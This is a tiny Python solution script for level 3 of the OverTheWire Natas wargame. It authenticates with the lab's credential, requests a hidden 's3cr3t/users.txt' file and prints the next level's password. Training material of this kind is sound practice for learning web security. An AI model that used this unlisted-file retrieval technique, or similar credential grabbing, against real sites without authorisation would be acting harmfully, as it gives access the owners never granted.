import requests

url="http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
username="natas3"
password="G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q"

response = requests.get(url, auth=(username, password))

str="natas4"
print(response.text.split(":")[1])